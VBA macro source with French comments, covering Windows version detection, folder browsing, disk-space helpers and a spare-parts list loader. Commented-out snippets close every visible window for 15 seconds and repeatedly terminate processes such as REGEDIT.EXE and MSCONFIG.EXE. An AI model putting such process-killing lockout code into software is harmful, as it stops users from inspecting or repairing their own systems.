                GetWindowsVersion = "Windows_95_A"
              Case "B", "C"
                GetWindowsVersion = "Windows_95_OSR2"
              Case Else
                GetWindowsVersion = "Windows_95"
            End Select

          Case 10
            Select Case VBA.UCase(VBA.Trim(.szCSDVersion))
              Case "A"
                GetWindowsVersion = "Windows_98_SE"
              Case Else
                GetWindowsVersion = "Windows_98"
            End Select

          Case 90
            GetWindowsVersion = "Windows_ME"
        End Select

      Case VER_PLATFORM_WIN32_NT
        Select Case .dwMajorVersion
          Case 3
            GetWindowsVersion = "Windows_NT_3." & CStr(.dwMinorVersion)

          Case 4
            If CInt(VBA.Right(VBA.Trim(.szCSDVersion), 1)) >= 6 Then
              If .wProductType = VER_NT_WORKSTATION Then
                GetWindowsVersion = "Windows_NT_4.0_Workstation"
              Else
                GetWindowsVersion = "Windows_NT_4.0_Server"
              End If
            Else
              GetWindowsVersion = "Windows_NT_4.0"
            End If

          Case 5
            Select Case .dwMinorVersion
              Case 0
                If .wProductType = VER_NT_WORKSTATION Then
                  GetWindowsVersion = "Windows_2000_Professional"
                Else
                  If (.wSuiteMask And VER_SUITE_ENTERPRISE) = VER_SUITE_ENTERPRISE Then
                    GetWindowsVersion = "Windows_2000_Advanced_Server"
                  ElseIf (.wSuiteMask And VER_SUITE_DATACENTER) = VER_SUITE_DATACENTER Then
                    GetWindowsVersion = "Windows_2000_Datacenter_Server"
                  Else
                    GetWindowsVersion = "Windows_2000_Server"
                  End If
                End If
              
              Case 1
                If .wProductType = VER_NT_WORKSTATION Then
                  If (.wSuiteMask And VER_SUITE_PERSONAL) = VER_SUITE_PERSONAL Then
                    GetWindowsVersion = "Windows_XP_Home_Edition"
                  Else
                    GetWindowsVersion = "Windows_XP_Professional"
                  End If
                Else
                  GetWindowsVersion = "Unknown"
                End If
              Case Else
                GetWindowsVersion = "Unknown"
            End Select
          
          Case Else
            GetWindowsVersion = "Unknown"
        End Select
      Case Else
        GetWindowsVersion = "Unknown"
    End Select
    
    Version_OS = .dwMajorVersion & "." & .dwMinorVersion & "." & .dwBuildNumber
    If VBA.InStr(.szCSDVersion, VBA.Chr(0)) <> 0 Then
      Version_OS = Version_OS & "_" & VBA.Left(.szCSDVersion, VBA.InStr(.szCSDVersion, VBA.Chr(0)) - 1)
    Else
      Version_OS = Version_OS & "_" & .szCSDVersion
    End If
    Version_OS = Replace(Version_OS, " ", "_")
    
    'If vba.UCase(vba.left(Application.OperatingSystem, 3)) <> "MAC" Then
      Type_Station = "PC"
    'Else
    '  Type_Station = "MAC"
    'End If
  End With
End Function


' ====================================================================================
' ChoixDossierFichier(Racine, Optional SelType As Byte = 0)                   FUNCTION
' ------------------------------------------------------------------------------------
' Show a file or folder browser.
' ====================================================================================

'Sub EssaiChoixDossier()
'    ChoixDossierFichier vbnullstring, "Choisissez un dossier :"
'End Sub


''S|fffd|lection d'un r|fffd|pertoire dans l'arborescence
'Function ChoixDossierFichier1(Racine, Msg As String, Optional SelType As Byte = 0)
'    Dim objShell
'    Dim objFolder
'    Dim Path            As String
'    Dim SecuriteSlash   As Integer
'    Dim FlagChoix&
'    Dim UserName        As String
'
'    On Error Resume Next
'    'Initialization
'    If SelType = 0 Then
'        FlagChoix = &H1&
'        'msg = "Choisissez un dossier :"
'    Else
'        FlagChoix = &H4000&
'        'msg = "Choisissez un fichier :"
'    End If
'
'    Set objShell = CreateObject("Shell.Application")
'
'    'Le troisi|fffd|me param|fffd|tre permet de choisir la s|fffd|lection d'un dossier ou d'un fichier (0 ou 1). Le dernier param|fffd|tre permet de choisir le dossier racine
'    Set objFolder = objShell.BrowseForFolder(&H0&, Msg, FlagChoix, Racine)
'
'    UserName = Application.UserName 'Le Nom de l'utilisateur de L'application Excel
'    Path = objFolder.ParentFolder.ParseName(objFolder.Title).Path & vbnullstring
'
'    ' Special parameters for 'SPOT Computers'
'    Select Case objFolder.Title
'        Case "Bureau"
'            Path = "C:\Documents and Settings\" & UserName & "\Desktop"
'        Case "Mes documents"
'            'Path = "\\f-sobek\home11$\" & UserName & "\MyDocs\"
'            Path = Nom_Long_Reseau("Mes documents")
'            Path = VBA.Left(Path, vba.Instr(Path, VBA.LCase(UserName)) - 1) & UserName & "\MyDocs\"
'        Case vbnullstring
'            Path = vbnullstring
'    End Select
'
'    SecuriteSlash = vba.Instr(objFolder.Title, ":")
'    If SecuriteSlash > 0 Then
'        Path = VBA.Mid(objFolder.Title, SecuriteSlash - 1, 2) & vbnullstring
'    End If
'
'    On Error GoTo 0
'    'Finalization
'    ChoixDossierFichier1 = Path
'End Function
'
'
'Function ChoixDossierFichier2() As String
'   Const conReturnOnlyFSDirs = &H1
'   Const conNoNewFolderButton = &H200
'   Const conBrowseIncludeFiles = &H4000
'
'   Dim objShell, objFichier, objFichierChoisi
'
'   Set objShell = CreateObject("Shell.Application")
'   Set objFichier = objShell.BrowseForFolder(&H0&, "Choisir le fichier", conReturnOnlyFSDirs + conNoNewFolderButton + conBrowseIncludeFiles)
'
'   If objFichier Is Nothing Then
'      MsgBox "Vous n'avez rien s|fffd|lectionn|fffd|", vbCritical, "Abandon"
'      'Wscript.Quit
'   Else
'      Set objFichierChoisi = objFichier.Self
'      ChoixDossierFichier2 = objFichierChoisi.Path
'   End If
'
'   Set objShell = Nothing
'   Set objFichier = Nothing
'   Set objFichierChoisi = Nothing
'End Function



'Renvoie le Nom du R|fffd|pertoire s|fffd|lectionn|fffd|
Public Function GetFolderName(FlagChoix As Long, Msg As String) As String
    'Constantes permettant de personnaliser le fonctionnement de BrowseForFolder
    'Const BIF_RETURNONLYFSDIRS = 1       '&H1 : uniquement les dossiers
    'Const BIF_DONTGOBELOWDOMAIN = 2
    'Const BIF_STATUSTEXT = 4
    'Const BIF_RETURNFSANCESTORS = 8
    'Const BIF_EDITBOX = 16               '&H10 : Affiche une zone d'|fffd|dition
    'Const BIF_VALIDATE = 32              '&H20 : V|fffd|rifie la saisie dans la zone d'|fffd|dition
    'Const BIF_NEWDIALOGSTYLE = 64
    'Const BIF_BROWSEINCLUDEURLS = 128
    'Const BIF_USENEWUI = (BIF_EDITBOX Or BIF_NEWDIALOGSTYLE)
    'Const BIF_BROWSEFORCOMPUTER = &H1000
    'Const BIF_BROWSEFORPRINTER = &H2000   '&H2000 : Autorise le parcours uniquement dans les dossiers "Mes documents" et "Bureau"
    'Const BIF_BROWSEINCLUDEFILES = &H4000 '&H4000 : les dossiers et les fichiers
    'Const BIF_SHAREABLE = &H8000
    '&H200 : Bouton Nouveau R|fffd|pertoire
    'Exemple FlagChoix = 1 + 2 + 4 + 8 + 16 + 32 + 64 + 128 + &H1000 + &H2000
    
    Dim bInfo   As BROWSEINFO
    Dim path    As String
    Dim r       As Long
    Dim pidl    As Long
    Dim Pos     As Integer
    
    bInfo.pidlRoot = &H0 'Root folder = desktop (modif 2.2, auparavaznt &H11=drives)
    If IsMissing(Msg) Then
        bInfo.lpszTitle = "Select a folder." 'S|fffd|lectionner un dossier.
    Else
        bInfo.lpszTitle = Msg ' the dialog title
    End If

    bInfo.ulFlags = FlagChoix '&H1 Type of directory to return
    pidl = SHBrowseForFolder(bInfo)  ' display the dialog

    path = VBA.Space$(512)
    r = SHGetPathFromIDList(ByVal pidl, ByVal path)
    If r Then
        Pos = VBA.InStr(path, VBA.Chr$(0))
        GetFolderName = VBA.Left(path, Pos - 1)
    Else
        GetFolderName = vbNullString
    End If
    CoTaskMemFree pidl
End Function


'Renvoie le Nom long R|fffd|seau
Function Nom_Long_Reseau(Z_Chemin As String) As String
    Dim Z_fsobj     As Object
    Dim Z_DrvName   As Object

    'If VBA.Mid(Z_Chemin, 2, 1) = ":" Then
    Set Z_fsobj = CreateObject("Scripting.FileSystemObject")
    Set Z_DrvName = Z_fsobj.GetDrive(Z_fsobj.GetDriveName(Z_fsobj.GetAbsolutePathName(VBA.Mid(Z_Chemin, 1, 2))))
    If VBA.Len(Z_DrvName.ShareName) = 0 Then
        'MsgBox "Ce n'est pas un Fichier R|fffd|seau"
        Nom_Long_Reseau = vbNullString
        Exit Function
    End If
    Nom_Long_Reseau = Z_DrvName.ShareName & VBA.Mid(Z_Chemin, 3)
    'End If
End Function


Private Function Conversion_KbMbGb(nombre As Currency) As String
    Const KB As Double = 1024
    Const MB As Double = KB * 1024
    Const GB As Double = MB * 1024
    
    If nombre <= 999 Then
        Conversion_KbMbGb = VBA.Str(nombre) & " bytes"
    ElseIf nombre <= KB * 999 Then
        Conversion_KbMbGb = VBA.Format((nombre / KB), "0.00") & " KB"
    ElseIf nombre <= MB * 999 Then
        Conversion_KbMbGb = VBA.Format((nombre / MB), "0.00") & " MB"
    ElseIf nombre <= GB * 999 Then
        Conversion_KbMbGb = VBA.Format((nombre / GB), "0.00") & " GB"
    End If
End Function


'Renvoie l'espace disponible sur le disque
Public Function Espace_Disque(sDisk As String) As String
    Dim SectorsPerCluster       As Long
    Dim BytesPerSector          As Long
    Dim NumberOfFreeClusters    As Long
    Dim TotalNumberOfClusters   As Long
    
    Dim Espace_Libre            As Currency
    Dim Espace_Total            As Currency
    Dim Espace_Utilise          As Currency
    
    GetDiskFreeSpace sDisk, SectorsPerCluster, BytesPerSector, NumberOfFreeClusters, TotalNumberOfClusters
      
    Espace_Libre = NumberOfFreeClusters * BytesPerSector * SectorsPerCluster
    Espace_Total = BytesPerSector * TotalNumberOfClusters * SectorsPerCluster
    Espace_Utilise = Espace_Total - Espace_Libre
    
    Espace_Disque = "Disque " & sDisk & vbCrLf & _
                    " - Espace Libre : " & Conversion_KbMbGb(Espace_Libre) & vbCrLf & _
                    " - Espace Utilis|fffd| : " & Conversion_KbMbGb(Espace_Utilise) & vbCrLf & _
                    " - Espace Total : " & Conversion_KbMbGb(Espace_Total)

    'VBA.format(rFree, "#,###,###,##0")
    'VBA.format(rTotal, "#,###,##0") & " Total bytes"
    
End Function


Public Function Espace_Disque_Disponible(sDisk As String, Taille As Currency) As String
    Dim fso     As Object
    Dim File    As Object
    Dim Utilise As Currency

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set File = fso.getfolder(sDisk)
    Utilise = File.Size 'Taille Occup|fffd|
    
    Espace_Disque_Disponible = "Disque " & sDisk & vbCrLf & _
                               " - Espace Libre : " & Conversion_KbMbGb(Taille - Utilise) & vbCrLf & _
                               " - Espace Utilis|fffd| : " & Conversion_KbMbGb(Utilise) & vbCrLf & _
                               " - Espace Total : " & Conversion_KbMbGb(Taille)

End Function


'Renvoie le Nom Logique d'un disque
Sub Get_Logical_Drive_String()
    Dim DrvString   As String
    Dim TotDrvs     As Long
    Dim Counter     As Integer
    
    'TotDrvs returns the total number of characters in return string
    TotDrvs = GetLogicalDriveStrings(0&, DrvString)
    'DrvString is the buffer created to hold the string
    DrvString = VBA.String(TotDrvs - 1, " ")
    'Calling GetLogicalDriveStrings a second time fills the string with valid data
    'example "a:\ c:\ d:\ e:\"
    TotDrvs = GetLogicalDriveStrings(TotDrvs, DrvString)
    
    'Parse through the return string displaying each in a msgbox
    For Counter = 1 To TotDrvs Step 4
        MsgBox VBA.Mid(DrvString, Counter, 3)
    Next Counter
End Sub


'Renvoie le Nom Court d'un r|fffd|pertoire
Sub Get_Short_Name()
    Dim LongStr     As String
    Dim ShortStr    As String
    Dim lStrLen     As Long
    Dim lRet        As Long
    
    'LongStr is any long file name or variable pointing to a file
    LongStr = ThisWorkbook.FullName
    lRet = GetShortPathName(LongStr, ShortStr, lStrLen)
    'This allows us to create a buffer the same length as
    'the returned string, saving us the trouble of having
    'to strip the left of the buffer to get the string
    ShortStr = VBA.String(lRet, " ")
    lRet = GetShortPathName(LongStr, ShortStr, lRet)
    MsgBox LongStr & "   was converted to   " & ShortStr
End Sub


'Renvoie le Nom du R|fffd|pertoire Syst|fffd|me
Sub Get_System_Directory()
    Dim Sys_Dir As String
    Dim res     As Long
    
    res = GetSystemDirectory(Sys_Dir, 0&)
    Sys_Dir = VBA.String(res - 1, " ")
    res = GetSystemDirectory(Sys_Dir, res)
    MsgBox Sys_Dir
End Sub


'Renvoie la r|fffd|solution de l'|fffd|cran
Sub Get_System_Metrics()
    Const SM_CXSCREEN = 0        ' Width of screen
    Const SM_CYSCREEN = 1        ' Height of screen

    Dim XVal As Long
    Dim YVal As Long
    
    YVal = GetSystemMetrics(SM_CYSCREEN)
    XVal = GetSystemMetrics(SM_CXSCREEN)
    MsgBox "Your Screen Resolution is " & XVal & " by " & YVal
End Sub


'==========================================================================================================
'=============================================== Code Non Valid|fffd| ==========================================
'==========================================================================================================
Function Systeme()
'  Dim tableau(7) As lesysteme, wa As Object 'wa As Word.Application
'''  Set wa = New Word.Application
''  Set wa = CreateObject("Word.Application")
'  tableau(1).nom = "Code de pays "
'  tableau(2).nom = "R|fffd|solution horizontale "
'  tableau(3).nom = "Langue du syst|fffd|me "
'  tableau(4).nom = "Syst|fffd|me d'exploitation "
'  tableau(5).nom = "Type de processeur "
'  tableau(6).nom = "Num|fffd|ro de version du SE "
'  tableau(7).nom = "R|fffd|solution verticale "
'  tableau(1).valeur = wa.System.Country
'  tableau(2).valeur = wa.System.HorizontalResolution
'  tableau(3).valeur = wa.System.LanguageDesignation
'  tableau(4).valeur = wa.System.OperatingSystem
'  tableau(5).valeur = wa.System.ProcessorType
'  tableau(6).valeur = wa.System.Version
'  tableau(7).valeur = wa.System.VerticalResolution
'  For I = 1 To 7
'    MsgBox tableau(I).nom & " : " & tableau(I).valeur
'  Next
''  Columns("a:b").AutoFit
''  wa.Quit
''  Set wa = Nothing
End Function


'Public Function OperatingSystem() As String
'  Dim WinVer As String
'  Dim lpVersionInformation As OSVERSIONINFO
'
'  lpVersionInformation.dwOSVersionInfoSize = vba.len(lpVersionInformation)
'  Call GetVersionEx(lpVersionInformation)
'  If (lpVersionInformation.dwPlatformId = 0) Then
'    WinVer = "Windows" 'Ouh L|fffd| L|fffd| !!
'  ElseIf (lpVersionInformation.dwPlatformId = 1) And (lpVersionInformation.dwMinorVersion = 0) Then
'    WinVer = "Windows 95"
'  ElseIf (lpVersionInformation.dwPlatformId = 1) And (lpVersionInformation.dwMinorVersion = 10) Then
'    WinVer = "Windows 98"
'  ElseIf (lpVersionInformation.dwPlatformId = 1) And (lpVersionInformation.dwMinorVersion = 90) Then
'    WinVer = "Windows ME"
'  ElseIf (lpVersionInformation.dwPlatformId = 2) And (lpVersionInformation.dwMajorVersion < 5) Then
'    WinVer = "Windows NT"
'  ElseIf (lpVersionInformation.dwPlatformId = 2) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 0) Then
'    WinVer = "Windows 2000"
'  ElseIf (lpVersionInformation.dwPlatformId = 2) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 1) Then
'    WinVer = "Windows XP"
'  End If
'  WinVer = WinVer & ";" & lpVersionInformation.dwMajorVersion & "." & lpVersionInformation.dwMinorVersion & "." & _
'    lpVersionInformation.dwBuildNumber
'
'  If vba.Instr(lpVersionInformation.szCSDVersion, vba.chr(0)) <> 0 Then
'    WinVer = WinVer & " " & vba.left(lpVersionInformation.szCSDVersion, vba.Instr(lpVersionInformation.szCSDVersion, vba.chr(0)) - 1)
'  Else
'    WinVer = WinVer & " " & lpVersionInformation.szCSDVersion
'  End If
'End Function


'Public Function getProductType(ByVal osinfo As OperatingSystem) As String
'  Dim osverinfo As OSVERSIONINFO
'  Dim result As Int32
'  osverinfo.dwOSVersionInfoSize = Marshal.SizeOf(osverinfo)
'  result = GetVersionEx(osverinfo)
'  If result = 0 Then
'    getProductType = "Unknown" 'Failed
'  End If
'  If osinfo.Version.Major = 4 Then
'    ' Windows NT
'    If osverinfo.wProductType = VER_NT_WORKSTATION Then
'      getProductType = "Workstation"
'    ElseIf osverinfo.wProductType = VER_NT_SERVER Then
'      getProductType = "Server"
'    Else
'      getProductType = "Unknown"
'    End If
'  ElseIf osinfo.Version.Major = 5 Then
'    ' Windows 2000 or XP
'    If osverinfo.wProductType = VER_NT_WORKSTATION Then
'        ' This is a workstation verion
'        If (osverinfo.wSuiteMask And VER_SUITE_PERSONAL) = _
'VER_SUITE_PERSONAL Then
'            getProductType "Personal"
'        Else
'            getProductType "Professional"
'        End If
'    ElseIf osverinfo.wProductType = VER_NT_SERVER Then
'        If osinfo.Version.Minor = 0 Then
'            ' This is Win2k
'            If (osverinfo.wSuiteMask And VER_SUITE_DATACENTER) = VER_SUITE_DATACENTER Then
'                getProductType "Datacenter Server"
'            ElseIf (osverinfo.wSuiteMask And VER_SUITE_ENTERPRISE) = VER_SUITE_ENTERPRISE Then
'                getProductType "Advanced Server"
'            Else
'                getProductType "Server"
'            End If
'        Else
'            ' This is XP/.NET
'            If (osverinfo.wSuiteMask And VER_SUITE_DATACENTER) = VER_SUITE_DATACENTER Then
'                getProductType "Windows.Net Datacenter Server"
'            ElseIf (osverinfo.wSuiteMask And VER_SUITE_ENTERPRISE) = VER_SUITE_ENTERPRISE Then
'                getProductType "Windows.NET Enterprise Server"
'            Else
'                getProductType "Server"
'            End If
'        End If
'    End If
'End If
'
'    End Function


''Verrouiller une Station
'Private Declare Function LockWorkStation Lib "user32.dll" () As Long
'
'Private Sub Form_Load()
'     LockWorkStation
'End Sub
'
'
''Verrouiller le Systeme
''attention le verrouillage du syst|fffd|me bloque tous les processus actifs. Pensez |fffd| fermer toutes les applications actives avant Ex|fffd|cution.
''N'EXECUTEZ PAS DEPUIS VB!!!! Cr|fffd|ez et lancer l'ex|fffd|cutable !!!
'
''source sur le FORM
'Public Function traite_tampon(valeur As String) As String
'Dim resultat As String
'Dim position As Integer
''r|fffd|cup|fffd|re la position du caract|fffd|re de s|fffd|paration "|"
'position = vba.Instr(1, valeur, "|", vbTextCompare)
'
''renvoit le r|fffd|sultat et met |fffd| jour la valeur
'If position <> 0 Then 'si aucune erreur
'resultat = vba.left(valeur, position - 1)
'valeur = vba. vba.right(valeur, vba.len(valeur) - position)
'traite_tampon = resultat
'End If
'
'End Function
' Public Sub fermer_taches(valeur As String)
'
'  Dim tache As String
'  Dim cpt As Integer
'  Do
'  'liste compl|fffd|te peut etre pass|fffd| en param par exemple
'  'termin|fffd|e par "|"
'
'  tache = traite_tampon(valeur)
'  If tache <> vbnullstring Then
'  resultat = FindWindow(vbNullString, tache)
'  resultat = SendMessage(resultat, WM_SYSCOMMAND, SC_CLOSE, NILL)
'  Else
'  Exit Do
'  End If
'  cpt = cpt + 1
'  Loop
'  End Sub
'Public Sub retourne_taches(info_taches As Boolean)
''Fonction permettant de connaitre les Appli en cours
'    On Error Resume Next
'    Dim Fenetre As Long
'    Dim Long_titre As Long
'    Dim NomTache As String
'
'    'recup 1er fenetre
'    Fenetre = GetWindow(Me.hwnd, GW_HWNDFIRST)
'
'    While Fenetre <> 0
'
'        Long_titre = GetWindowTextLength(Fenetre)
'        NomTache = vba.space$(Long_titre + 1)
'        Long_titre = GetWindowText(Fenetre, NomTache, Long_titre + 1)
'        NomTache = vba.left(NomTache, vba.len(NomTache) - 1)
'
'        If Long_titre <> 0 Then
'            If NomTache <> vbnullstring And vba.ucase(NomTache) <> App.EXEName Then
'                If IsWindowVisible(Fenetre) Then
'                    liste_fen = liste_fen & NomTache & "|"
'                End If
'            End If
'        End If
'
'    'recup fenetre suivante
'    Fenetre = GetWindow(Fenetre, GW_HWNDNext)
'    DoEvents 'multitaches
'
'    Wend
'End Sub
'Public Sub verif_modules()
'On Error Resume Next
'Do
'retourne_taches False
'Call fermer_taches(liste_fen)
'DoEvents
'Loop Until Not verrouille
'End Sub
'
'Private Sub Form_Load()
'If MsgBox("Vous allez verrouiller le syst|fffd|me pendant 15 sec. Tous les modules de Windows seront bloqu|fffd|s." & vba.chr(10) & vba.chr(10) & " Continuer ?", vbYesNo + vbExclamation, "Verrouillage") = vbYes Then
'verrouille = True
'Timer1.Interval = 15000
'Call verif_modules
'Else
'Unload Me
'End If
'End Sub
'
''ajouter un contr|fffd|le TIMER et ajouter le code
'
'Private Sub Timer1_Timer()
'verrouille = False
'MsgBox "Syst|fffd|me d|fffd|verrouill|fffd|", vbInformation, "Verrouillage"
'Unload Me
'End Sub
'
''ajouter un MODULE et le code suivant
'
'
''API des taches(fenetres)
'Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpwindowname As String) As Long
'Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
'Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
'Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
'Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
'Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
'Public Declare Function getDesktop Lib "jpeg.dll" (ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal blnJpeg As Boolean, ByVal JPGCompressQuality As Integer, ByVal strFileName As String) As Integer
'Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
'
''listes de taches
'Public Const GW_HWNDFIRST = 0
'Public Const GW_HWNDNext = 2
'
''fermeture des taches
'Public Const WM_SYSCOMMAND = &H112
'Public Const SC_CLOSE = &HF060&
'Public Const NILL = 0&
'
''variables globales
'Public verrouille As Boolean
'Public liste_fen As String
'
'
'
'
''INTERDIRE / INTERROMPRE L'EX|fffd|CUTION DE PROCESSUS
''copier la cat|fffd|gorie FORM ds une nouvelle feuille ajouter un module et coller la cat|fffd|gorie module dedans L'ex|fffd|cution s'arr|fffd|te lorsque la feuille est ferm|fffd|e
''feuille FORM
'Public Function existe(valeur As String) As Boolean
'
''Test si valeur appartient |fffd| la collection des interdits
'
'Dim i As Integer
'i = 1
'While i < interdit.Count And interdit.item(i) <> valeur
'i = i + 1
'Wend
'If interdit.item(i) = valeur Then
'existe = True
'Else
'existe = False
'End If
'End Function
'
'Public Sub ferme_process(valeur As String)
''ferme le processus dont l'ID est valeur
'' valeur devrait |fffd|tre de type long ms ce param|fffd|trage
''permet d'utiliser de l'hexad|fffd|cimal
'
'Dim ID_proc As Long
'Dim hprocess As Long
'Dim nRet As Long
'Dim tache As String
'Dim cpt As Integer
'ID_proc = CLng(valeur)
'hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, False, ID_proc)
'GetExitCodeProcess hprocess, nRet
'Call TerminateProcess(hprocess, nRet)
'Call CloseHandle(hprocess)
'End Sub
'
'Public Sub retourne_processus()
''retourne la liste des processus actifs (sauf notre app)
'
'Dim cpt As Integer
'Dim strNomExe As String
'Dim strProcessID As String
'Dim lngSnapShot As Long
'Dim r As Long
'Dim uProcess As PROCESSENTRY32
'lngSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
'If lngSnapShot <> 0 Then
'uProcess.lSize = vba.len(uProcess)
'r = ProcessFirst(lngSnapShot, uProcess)
'
'    Do While r
'       strNomExe = vba.left(uProcess.sExeFile, vba.Instr(1, uProcess.sExeFile, vbNullChar) - 1)
'         If retourne_exe(strNomExe) <> App.EXEName Then
'          collect.Add retourne_exe(strNomExe), retourne_exe(strNomExe) & cpt 'plusieurs instances du m|fffd|me EXE possible
'          cpt = cpt + 1
'          collect.Add CStr(uProcess.lProcessId), CStr(uProcess.lProcessId)
'         End If
'       r = ProcessNext(lngSnapShot, uProcess)
'   Loop
'    CloseHandle (lngSnapShot)
'End If
'End Sub
'
'Public Function retourne_exe(valeur As String) As String
'
''cette fonction renvoit uniquement le nom de l'EXE
''nb: cette fonction |fffd|tait utile ds mon projet ms vous
''pouvez la supprimer pour avoir le chemin complt des EXE
'
'Dim ind As Integer
'Dim ancien As Integer
'ancien = 0
'i = vba.len(valeur)
'Do
'ind = vba.Instr(ancien + 1, valeur, "\", vbBinaryCompare)
'If ind <> 0 Then
'ancien = ind
'Else
'Exit Do
'End If
'Loop
'retourne_exe = vba. vba.right(valeur, i - ancien)
'End Function
'
'Private Sub Form_Load()
''exemple de fichiers |fffd| interdire
'Me.show
'interdit.Add "REGEDIT.EXE", "REGEDIT.EXE"
'interdit.Add "IEXPLORE.EXE", "IEXPLORE.EXE"
'interdit.Add "MSCONFIG.EXE", "MSCONFIG.EXE"
'interdit.Add "WINIPCFG.EXE", "WINIPCFG.EXE"
'
'Do
'Set collect = Nothing
'retourne_processus
'For i = 1 To collect.Count Step 2
'    If existe(vba.ucase(collect.item(i))) Then 'si trouv|fffd|
'    ferme_process (collect.item(i + 1))
'    MsgBox "Session [" & collect.item(i) & "] trouv|fffd|e", vbExclamation, "Attention"
'    End If
'Next i
'DoEvents 'multitaches
'Loop Until fin
'End Sub
'
'Private Sub Form_Unload(Cancel As Integer)
'fin = True
'End Sub
'
'
'' module
''var globale de fin du prog
'Public fin As Boolean
'
''collections
'Public collect As New Collection
'Public interdit As New Collection
'
''constantes processus
'Public Const MAX_PATH = 260
'Public Const TH32CS_SNAPPROCESS = 2&
'Public Const PROCESS_QUERY_INFORMATION = &H400
'
''type processus
'Public Type PROCESSENTRY32
'    lSize As Long
'    lUsage As Long
'    lProcessId As Long
'    lDefaultHeapId As Long
'    lModuleId As Long
'    lThreads As Long
'    lParentProcessId As Long
'    lPriClassBase As Long
'    lFlags As Long
'    sExeFile As String * MAX_PATH
'End Type
'
''API processus & threads
'Public Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessId As Long) As Long
'Public Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
'Public Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
'Public Declare Sub CloseHandle Lib "kernel32" (ByVal hPass As Long)
'Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
'Public Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hprocess As Long, lpExitCode As Long) As Long
'Public Declare Function TerminateProcess Lib "kernel32" (ByVal hprocess As Long, ByVal uExitCode As Long) As Long
Attribute VB_Name = "TDI_Charge_Mat"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.2 du 19/03/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


    
'**********************************************
' cette fonction permet d'ajouter dans
' la liste PR les nouveaux articles trouv|fffd|s
' dans les feuille MAT|fffd|RIELS
'***********************************************
Sub Charge_Mat(WsPiecesRechange As Worksheet)
    Dim i_dec As Long
    Dim Nb_Art_TDI As Long
    Dim num_ssen As String

    Init_var_PR WsPiecesRechange
    Init_var_dec ThisWorkbook.Worksheets(shMateriels)
    
    Nb_Art_TDI = Lastline(ThisWorkbook.Sheets(shMateriels))
    For i_dec = FirstLine(shMateriels) To Nb_Art_TDI
        'If ThisWorkbook.Sheets(Materiel).Cells(i, 6).Value = "A" And ThisWorkbook.Sheets(Materiel).Cells(i, 19).Value <> "N" Then
        Lire_Dec i_dec, shMateriels
        If Niveau_dec = "A" Or Niveau_dec = "S" Then 'And Etude_suf_Dec = vbnullstring
            
            num_ssen = ThisWorkbook.Sheets(ShAffaire).Cells(23, 5).Value
            If num_ssen = vbNullString Then
                num_ssen = "Affaire_?"
            End If
            Qte = VBA.val(Qte_Dec)
            'lig = Ind_PR
            Ind_PR = 6
            Ind_PR = Ind_PR
            i_dec = i_dec
            If Not Exist_PdR(Cle_Art_dec) Then
            ' cas de la Cr|fffd|ation
                'lig = nb_ligne_element + 5
                WsPiecesRechange.Cells(Ind_PR, 1).Value = num_ssen
                WsPiecesRechange.Cells(Ind_PR, 2).Value = nb_ligne_element
                WsPiecesRechange.Cells(Ind_PR, P_Categorie_PR).Value = Categorie_Dec
                
                WsPiecesRechange.Cells(Ind_PR, P_SacimMabec_PR).Value = SacimMabec_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Etude_Ref_PR).Value = Cle_Ref_dec ' Etude_ref_Dec    '21 Etude_suf_Dec    '22
                WsPiecesRechange.Cells(Ind_PR, P_Etude_Nom_PR).Value = Etude_nom_Dec    '23
                WsPiecesRechange.Cells(Ind_PR, P_Design_PR).Value = Design_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Ref_Int_PR).Value = Ref_Int_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Nom_Int_PR).Value = Nom_Int_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Date_Modif_PR).Value = VBA.Date
                WsPiecesRechange.Cells(Ind_PR, P_Date_Modif_PR).Value = VBA.Format(Now, "dd/mm/yyyy")
                WsPiecesRechange.Cells(Ind_PR, P_Rapproche_PR).Value = "Nouv"
                WsPiecesRechange.Cells(Ind_PR, P_Ref_Origine_PR).Value = Cle_Ref_dec ' Etude_ref_Dec    '21 Etude_suf_Dec    '22
                WsPiecesRechange.Cells(Ind_PR, P_Nom_Origine_PR).Value = Etude_nom_Dec
                Select Case ThisWorkbook.Worksheets(ShAffaire).Cells(20, 7).Value
                Case 1 ' cas de premi|fffd|re langue
                    WsPiecesRechange.Cells(Ind_PR, P_Lib_court1_PR).Value = VBA.Mid(Design_Dec, 1, 40)
                Case 2 ' cas de deuxi|fffd|me langue
                    WsPiecesRechange.Cells(Ind_PR, P_Lib_court2_PR).Value = VBA.Mid(Design_Dec, 1, 40)
                Case Else
        
                End Select
